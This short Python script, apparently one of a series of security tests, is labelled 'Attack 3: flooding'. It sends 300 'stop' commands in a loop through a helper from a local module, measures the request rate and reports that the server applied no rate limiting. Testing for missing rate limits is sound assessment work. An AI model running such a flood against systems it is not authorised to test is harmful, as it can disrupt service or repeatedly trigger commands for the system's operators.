"""Attack 3: flooding. No rate limit on commands."""
import time
from common import send

N = 300
start = time.time()
codes = [send("stop").status_code for _ in range(N)]
elapsed = time.time() - start
print(f"Sent {N} commands in {elapsed:.2f}s ({N / elapsed:.0f} req/s)")
print("Status codes:", {c: codes.count(c) for c in set(codes)})
print("RESULT: server accepted all of them, no rate limiting.")
